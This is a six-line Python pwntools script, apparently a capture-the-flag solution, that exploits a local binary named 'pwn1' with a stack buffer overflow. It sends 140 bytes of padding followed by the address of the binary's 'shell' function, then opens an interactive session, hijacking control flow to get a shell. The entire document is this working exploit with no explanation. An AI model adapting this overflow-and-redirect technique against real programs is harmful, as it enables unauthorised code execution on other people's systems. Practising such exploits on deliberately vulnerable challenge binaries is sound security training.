from pwn import *

e = ELF("./pwn1")
p = process("./pwn1")
p.sendline(b"A" * 128 + b"a" * 12 + p32(e.functions["shell"].address))
p.interactive()
